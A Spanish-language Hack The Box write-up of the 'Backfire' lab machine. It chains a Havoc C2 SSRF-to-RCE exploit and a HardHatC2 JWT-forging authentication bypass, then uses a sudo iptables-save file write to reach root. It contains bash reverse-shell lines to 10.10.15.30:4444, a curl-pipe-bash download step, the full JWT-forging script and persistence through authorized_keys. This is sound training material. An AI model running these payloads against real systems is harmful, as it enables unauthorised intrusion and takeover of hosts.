
# Backfire

<figure><img src="/files/eeSBHzCQyKGGT400yHYI" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Información General</mark>

* **Nombre de la máquina:** `Backfire`
* **IP:** `10.10.11.49`
* **Sistema operativo:** `Linux`
* **Dificultad:** `🟡 Media`
* **Fecha:** `09/06/2025`

***

## <mark style="color:purple;">Reconocimiento Inicial</mark>

#### Añadimos la IP al /etc/hosts

```bash
sudo echo "10.10.11.49 backfire.htb" | sudo tee -a /etc/hosts
```

### Escaneo de Puertos

```bash
sudo nmap -v -sCV -T5 10.10.11.49
```

```bash
PORT     STATE    SERVICE  VERSION
22/tcp   open     ssh      OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
443/tcp  open     ssl/http nginx 1.22.1
5000/tcp filtered upnp
8000/tcp open     http     nginx 1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Destacan los puertos 8000 (servicio web), 443 y el puerto 5000 (filtered).

### Acceso Web

Accedemos a `10.10.11.49:8000` y observamos que hay 2 archivos a los que tenemos acceso.

<figure><img src="/files/iR0OdFKAyXmnZ396sV9D" alt=""><figcaption></figcaption></figure>

El archivo `disable_tls` nos indica un un puerto en localhost `40056` por el que corre la aplicación web, pero al que solo podemos acceder por SSH forwarding. Indica que el usuario `serjeg` no está trabajando, por lo que sobre todo centraremos nuestros esfuerzos en otros usuarios:

```
Disable TLS for Websocket management port 40056, so I can prove that
sergej is not doing any work
Management port only allows local connections (we use ssh forwarding) so 
this will not compromize our teamserver
```

Antes de que se aplique el parche, el servidor escucha utilizando `wss`, que se conecta solo a HTTPS, y viceversa. Ahora, eso ha cambiado a `ws`, lo que permite a los usuarios comunicarse en HTTP. Además, se elimina la llamada al método `setSslConfiguration`, lo que permite una conexión HTTP insegura.

En el archivo havoc encontramos  y credenciales de varios usuarios: `ilya` y `sergej`:

```json
Teamserver {
    Host = "127.0.0.1"
    Port = 40056

    Build {
        Compiler64 = "data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"
        Compiler86 = "data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc"
        Nasm = "/usr/bin/nasm"
    }
}

Operators {
    user "ilya" {
        Password = "CobaltStr1keSuckz!"
    }

    user "sergej" {
        Password = "1w4nt2sw1tch2h4rdh4tc2"
    }
}

Demon {
    Sleep = 2
    Jitter = 15

    TrustXForwardedFor = false

    Injection {
        Spawn64 = "C:\\Windows\\System32\\notepad.exe"
        Spawn32 = "C:\\Windows\\SysWOW64\\notepad.exe"
    }
}

Listeners {
    Http {
        Name = "Demon Listener"
        Hosts = [
            "backfire.htb"
        ]
        HostBind = "127.0.0.1" 
        PortBind = 8443
        PortConn = 8443
        HostRotation = "round-robin"
        Secure = true
    }
}
```

El listener escucha en `TCP/8443`. A partir del resultado del escaneo Nmap, sabemos que Nginx escucha en `TCP/443`, lo que puede indicar que Nginx se está utilizando como un redireccionador. Al observar los exploits públicos para `Havoc C&C`, hay un Server [Side Request Forgery](https://github.com/chebuya/Havoc-C2-SSRF-poc/) y una[ Ejecución Remota de Código Autenticada](https://github.com/sebr-dev/Havoc-C2-SSRF-to-RCE).

## <mark style="color:purple;">Foothold inicial</mark>

El primer paso en nuestra cadena de ataque es verificar si los Proof of Concepts proporcionados funcionan como se espera. El PoC de SSRF requiere tres argumentos de línea de comandos: la URL objetivo, la dirección IP y el puerto del listener del atacante.

{% embed url="<https://github.com/chebuya/Havoc-C2-SSRF-poc.git>" %}

```bash
python3 exploit.py -t https://backfire.htb/ -i 10.10.15.30 -p 80

[***] Trying to register agent...
[***] Success!
[***] Trying to open socket on the teamserver...
[***] Success!
[***] Trying to write to the socket
[***] Success!
[***] Trying to poll teamserver for socket output...
[***] Read socket output successfully!

HTTP/1.0 404 File not found
Server: SimpleHTTP/0.6 Python/3.13.2
<----SNIP---->
```

Observamos la respuesta HTTP de nuestro listener:&#x20;

```bash
python3 -m http.server 80

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.49 - - [09/Jun/2025 09:19:15] code 404, message File not found
10.10.11.49 - - [09/Jun/2025 09:19:15] "GET /vulnerable HTTP/1.1" 404 -
```

Esto confirma que el SSRF está funcionando: el objetivo vulnerable está realizando solicitudes HTTP a un servidor controlado por el atacante.&#x20;

### Havoc RCE

La explotación de ejecución remota de código (RCE) requiere una conexión WebSocket válida al servidor de Havoc. A partir del perfil expuesto de Havoc, sabemos que el listener de WebSocket corre en el puerto TCP `40056`, el cual no es accesible externamente de forma directa. Sin embargo, dado que el SSRF permite solicitudes HTTP internas, podemos sondear este puerto a través de localhost (`127.0.0.1`):

```bash
python3 exploit.py -t https://backfire.htb/ -i 127.0.0.1 -p 40056

[***] Trying to register agent...
[***] Success!
[***] Trying to open socket on the teamserver...
[***] Success!
[***] Trying to write to the socket
[***] Success!
[***] Trying to poll teamserver for socket output...
[***] Read socket output successfully!
HTTP/1.1 404 Not Found
Content-Type: text/plain
Date: Mon, 09 Jun 2025 07:25:35 GMT
Content-Length: 18
Connection: close

404 page not found
```

Recibir un 404 Not Found confirma que el puerto está abierto y acepta solicitudes HTTP, lo cual es un paso clave hacia el encadenamiento de SSRF con RCE.

### SSRF a RCE

{% embed url="<https://github.com/sebr-dev/Havoc-C2-SSRF-to-RCE>" %}

#### Crear Reverse Shell

```bash
echo "bash -c 'bash -i >& /dev/tcp/10.10.15.30/4444 0>&1'" > shell.sh
```

#### Abrir servidor local con python

```q
python3 -m http.server 80
```

#### Ejecución del exploit

Ejecutamos el exploit pasándole las credenciales del usuario ilya y conseguimos una reverse shell. Cuando nos salte el prompt para introducir un comando usamos `curl http://10.10.15.30/shell.sh | bash`

```shell-session
afsh4ck@kali:~$ python3 CVE-2024-41570.py -t https://10.10.11.49/ -i 127.0.0.1 -p 40056 -U ilya -P CobaltStr1keSuckz!

[***] Trying to register agent...
[***] Success!
[***] Trying to open socket on the teamserver...
[***] Success!
[***] Trying to write to the socket
[***] Success!
[***] Trying to poll teamserver for socket output...
[***] Read socket output successfully!

[***] Trying to write to the socket
[***] Success!
[***] Trying to poll teamserver for socket output...
[***] Read socket output successfully!

[***] Trying to write to the socket
[***] Success!
[***] Trying to poll teamserver for socket output...
[***] Read socket output successfully!

Enter command to execute: curl http://10.10.15.30/shell.sh | bash
[***] Trying to write to the socket
[***] Success!
[***] Trying to poll teamserver for socket output...
[***] Read socket output successfully!
```

#### Recibir Reverse Shell

<figure><img src="/files/D6pVTGQRM4DqwgmVKQnB" alt=""><figcaption></figcaption></figure>

```shell-session
afsh4ck@kali:~$ nc -lvnp 4444

listening on [any] 4444 ...
connect to [10.10.15.30] from (UNKNOWN) [10.10.11.49] 33342
bash: cannot set terminal process group (17577): Inappropriate ioctl for device
bash: no job control in this shell

ilya@backfire:~/Havoc/payloads/Demon$ whoami
ilya

ilya@backfire:~/Havoc/payloads/Demon$ id
uid=1000(ilya) gid=1000(ilya) groups=1000(ilya),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
```

***

## <mark style="color:purple;">User Flag</mark>

```shell-session
ilya@backfire:/$ cd home
ilya@backfire:/home$ ls
ls
ilya
sergej
ilya@backfire:/home$ cd ilya    
ilya@backfire:~$ ls
files
hardhat.txt
Havoc
user.txt
ilya@backfire:~$ cat user.txt
b2490c6b75ef20271e3037************
```

***

## <mark style="color:purple;">Persistencia SSH</mark>

La sesión de la shell dura muy poco tiempo, por lo que generaremos un par de claves SSH para mantener el acceso sin contraseña:

#### Generar clave desde Kali

```shell-session
afsh4ck@kali:~$ ssh-keygen -t ed25519 -f ~/.ssh/backfire

Generating public/private ed25519 key pair.
Enter passphrase for "/home/kali/.ssh/backfire" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/.ssh/backfire
Your public key has been saved in /home/kali/.ssh/backfire.pub
The key fingerprint is:
SHA256:hpStApUNtpYHFcy9M0FcAlzxILY4c8+ZDAQ7WzRFVmE kali@kali
The key's randomart image is:
+--[ED25519 256]--+
|    *XXXX+E.     |
|   o.X=B+=       |
|  . X O .o.      |
|   o X B+o       |
|    o o So       |
|     . .         |
|                 |
|                 |
|                 |
+----[SHA256]-----+
```

```shell-session
afsh4ck@kali:~$ cat ~/.ssh/backfire.pub

ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJPQGPT441sUffHWW34CfPAoevpOpJzFIGmmZue/Acq1 kali@kali
```

#### Insertar en el objetivo

```shell-session
ilya@backfire:~$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJPQGPT441sUffHWW34CfPAoevpOpJzFIGmmZue/Acq1 kali@kali' >> ~/.ssh/authorized_keys
```

#### Conexión sin contraseña

```shell-session
afsh4ck@kali:~$ ssh -i ~/.ssh/backfire ilya@10.10.11.49
                               
Linux backfire 6.1.0-29-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.123-1 (2025-01-02) x86_64
ilya@backfire:~$ 
```

***

## <mark style="color:purple;">Escalada de Privilegios</mark>

Al leer `hardhat.txt`, descubrimos que Sergej instaló **HardHatC2** para pruebas:

```shell-session
ilya@backfire:~$ cat hardhat.txt

Sergej said he installed HardHatC2 for testing and  not made any changes to the defaults
I hope he prefers Havoc bcoz I don't wanna learn another C2 framework, also Go > C# 
```

### Comprobar servicios internos

```shell-session
ilya@backfire:~$ ss -tuln

Netid           State            Recv-Q           Send-Q                       Local Address:Port                        Peer Address:Port           Process           
udp             UNCONN           0                0                                  0.0.0.0:68                               0.0.0.0:*                                
tcp             LISTEN           0                4096                             127.0.0.1:8443                             0.0.0.0:*                                
tcp             LISTEN           0                511                                0.0.0.0:8000                             0.0.0.0:*                                
tcp             LISTEN           0                4096                             127.0.0.1:40056                            0.0.0.0:*                                
tcp             LISTEN           0                511                                0.0.0.0:443                              0.0.0.0:*                                
tcp             LISTEN           0                128                                0.0.0.0:22                               0.0.0.0:*                                
tcp             LISTEN           0                512                                0.0.0.0:5000                             0.0.0.0:*                                
tcp             LISTEN           0                512                                0.0.0.0:7096                             0.0.0.0:*                                
tcp             LISTEN           0                128                                   [::]:22                                  [::]:*   
```

Nos llama la atención los puertos 5000 y 7096.

### Port Forwarding SSH

Redirigiremos el tráfico a esos puertos para ver los servicios expuestos:

```bash
ssh -i ~/.ssh/backfire ilya@backfire.htb -L 7096:127.0.0.1:7096 -L 5000:127.0.0.1:5000
```

Accedemos al portal web en `https://localhost:7096`

<figure><img src="/files/tUlOBFCsFyPcxNg8xU2p" alt=""><figcaption></figcaption></figure>

Probamos las contraseñas que tenemos hasta ahora de los usuarios pero no funcionan, por lo que tendremos que buscar otra vía para acceder.

### Explotación de HardHatC2 – Auth Bypass + RCE

Encontramos este excelente artículo con vulnerabilidades 0day en HardHatC2:\
[HardHatC2 0-Days (RCE & AuthN Bypass) | by Pichaya Morimoto | สยามถนัดแฮก](https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7)\
Vulnerabilidades destacadas:

* Arbitrary File Write
* Authentication Bypass
* Remote Code Execution (RCE)

Probamos el **bypass de autenticación**, y confirmamos que se creó el usuario `sth_pentest`:

{% code title="hardhat\_exploit.py" %}

```python
# @author Siam Thanat Hack Co., Ltd. (STH)
import jwt
import datetime
import uuid
import requests

rhost = '127.0.0.1:5000'

# Craft Admin JWT
secret = "jtee43gt-6543-2iur-9422-83r5w27hgzaq"
issuer = "hardhatc2.com"
now = datetime.datetime.utcnow()

expiration = now + datetime.timedelta(days=28)
payload = {
    "sub": "HardHat_Admin",  
    "jti": str(uuid.uuid4()),
    "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier": "1",
    "iss": issuer,
    "aud": issuer,
    "iat": int(now.timestamp()),
    "exp": int(expiration.timestamp()),
    "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "Administrator"
}

token = jwt.encode(payload, secret, algorithm="HS256")
print("Generated JWT:")
print(token)

# Use Admin JWT to create a new user 'sth_pentest' as TeamLead
burp0_url = f"https://{rhost}/Login/Register"
burp0_headers = {
  "Authorization": f"Bearer {token}",
  "Content-Type": "application/json"
}
burp0_json = {
  "password": "sth_pentest",
  "role": "TeamLead",
  "username": "sth_pentest"
}
r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)
print(r.text)
```

{% endcode %}

#### Confirmamos que se crea el usuario `sth_pentest`

```shell-session
afsh4ck@kali:~$ python3 hardhat_exploit.py
                                                                     
/home/kali/Escritorio/machines/htb/backfire/hardhat_exploit.py:12: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
Generated JWT:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJIYXJkSGF0X0FkbWluIiwianRpIjoiNGEzNTA4NTctNTdjNi00YmE2LWI5NTctNGMzN2YwMTIxMjMxIiwiaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvd3MvMjAwNS8wNS9pZGVudGl0eS9jbGFpbXMvbmFtZWlkZW50aWZpZXIiOiIxIiwiaXNzIjoiaGFyZGhhdGMyLmNvbSIsImF1ZCI6ImhhcmRoYXRjMi5jb20iLCJpYXQiOjE3NDk0NjY3MzcsImV4cCI6MTc1MTg4NTkzNywiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjoiQWRtaW5pc3RyYXRvciJ9.aIEVSvEyqoDU778lrCDsjOyXVQq6S7fG8VUUZEP-zYM
/usr/lib/python3/dist-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host '127.0.0.1'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
  warnings.warn(
User sth_pentest created
```

Accedemos a Hardhat C2 con las credenciales:

```
sth_pentest:sth_pentest
```

<figure><img src="/files/7ZRdnLz85TTfC8xIDqhi" alt=""><figcaption></figcaption></figure>

### Hardhat RCE

Después de obtener un usuario con rol `TeamLead` utilizando la vulnerabilidad de omisión de autenticación, un atacante puede interactuar con los implants y **el propio host C2** para ejecutar comandos del sistema operativo.

Hacemos click en el botón azul "Interact" y vamos a la terminal arriba del todo:

<figure><img src="/files/nb8Qg3M3Sr63HTTYKVtW" alt=""><figcaption></figcaption></figure>

***

## 👑 <mark style="color:purple;">Root Flag</mark>

Dentro de la interfaz **Implant Interact -> Terminal** , el atacante puede emitir comandos arbitrarios que se ejecutan con **privilegios de root** (por configuración predeterminada) en el host C2 de la víctima o en los hosts del implante.

No podemos leer la flag directamente pero podemos conseguir una reverse shell como el usuario sergej:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.15.30/4444 0>&1'
```

<figure><img src="/files/UC6ZKoSUAtTzG1m6ntD9" alt=""><figcaption></figcaption></figure>

### Permisos de ejecución

```shell-session
sergej@backfire:~$ sudo -l

Matching Defaults entries for sergej on backfire:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User sergej may run the following commands on backfire:
    (root) NOPASSWD: /usr/sbin/iptables
    (root) NOPASSWD: /usr/sbin/iptables-save
```

Un poco de investigación sobre estas herramientas debería ayudarnos a encontrar un blog escrito por smaury.

{% embed url="<https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/>" %}

El blog tiene como objetivo explotar una vulnerabilidad de escritura de archivos arbitraria, permitiendo a un atacante escribir en cualquier archivo. Podemos añadir nuestra clave SSH a los `authorized_keys` del root (o crear una nueva) e iniciar sesión como root.

#### Crear SSH Key de Root

```shell-session
sergej@backfire:~$ ssh-keygen -t ed25519 -f root_key -N ""   

Generating public/private ed25519 key pair.
Your identification has been saved in root_key
Your public key has been saved in root_key.pub
The key fingerprint is:
SHA256:o9p3XzkFrne6QGYNpiaR60WpXsgG0AC3/er46FTkRlc sergej@backfire
The key's randomart image is:
+--[ED25519 256]--+
|  ..+o    E      |
|   . +.  o .     |
|    . = + o o .  |
|     + = * o + . |
|      + S = + o .|
|     o * * + . o |
|    . o o   o = .|
|   . *  . .  + + |
|   .=.+. . .. o. |
+----[SHA256]-----+

sergej@backfire:~$ PUBKEY=$(cat root_key.pub)   
sergej@backfire:~$ SSH_COMMENT=$'\n'"$PUBKEY"$'\n'   
sergej@backfire:~$ sudo /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comment "$SSH_COMMENT"   
sergej@backfire:~$ sudo /usr/sbin/iptables-save -f /root/.ssh/authorized_keys   
```

Nos copiamos la llave SSH `root_key` a nuestro Kali

```shell-session
sergej@backfire:~$ cat root_key

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACAgANzDlnKma/AWd3LqTC7NjNljDpI/7dq8CHNhJWA6tAAAAJg2ti8ENrYv
BAAAAAtzc2gtZWQyNTUxOQAAACAgANzDlnKma/AWd3LqTC7NjNljDpI/7dq8CHNhJWA6tA
AAAED57JlBtj1WNqJtNGQwrYchZau9GP2k3Hpnr1iqvnD7WyAA3MOWcqZr8BZ3cupMLs2M
2WMOkj/t2rwIc2ElYDq0AAAAD3NlcmdlakBiYWNrZmlyZQECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
```

<pre class="language-shell-session"><code class="lang-shell-session"><strong>afsh4ck@kali:~$ chmod 600 root_key                 
</strong>
afsh4ck@kali:~$ ssh -i root_key root@backfire.htb
Linux backfire 6.1.0-29-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.123-1 (2025-01-02) x86_64
<strong>
</strong><strong>root@backfire:~# whoami
</strong>root
root@backfire:~# id
uid=0(root) gid=0(root) groups=0(root)
root@backfire:~# ls
root.txt
root@backfire:~# cat root.txt
b20434308206862458e280************
</code></pre>

Y ya somos root!
